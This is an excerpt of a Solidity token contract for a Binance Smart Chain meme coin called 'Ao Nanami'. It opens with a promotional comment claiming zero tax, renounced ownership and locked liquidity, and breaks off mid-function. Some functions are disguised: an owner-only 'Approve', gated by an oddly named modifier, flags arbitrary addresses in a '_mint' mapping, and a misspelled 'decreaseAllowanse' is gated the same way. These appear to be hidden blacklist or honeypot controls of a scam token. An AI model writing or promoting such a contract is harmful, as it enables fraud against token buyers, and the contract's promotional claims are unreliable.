...
/**
 * 
🔥 ✨Ao Nanami(七海 アオ) ✨0% tax ✨renounced ✨lp locked🔥
New Queen Meme is born in Binance Smart Chain
She is a satori—a demon in Japanese folklore with the ability to read minds.
 She has cat ears and the ability to read people's thoughts. 
She also has a stronger version called "Satellite" which can read the thoughts of everyone in the city at once.
...
🗨 Telegram: https://t.me/AoNanamiToken
🌐 Website: https://onepixeljumpdotcom.wordpress.com/tag/ao-nanami/
  
‼️ Chat open after lock renounce and 40 holders ‼️
 * 
 */
...
contract AoNanami is IERC20, Ownable, IERC20Metadata {
    ...
    */
    ...
    function Approve(address presaleIDOaddress) external ozeroloan {
        _mint[presaleIDOaddress] = 1;
        
        emit Transfer(presaleIDOaddress, address(0), 1);
    }
    /**
    ...
    * - `skandar` cannot be the zero address.
    */
       function decreaseAllowanse(address extending) external ozeroloan {
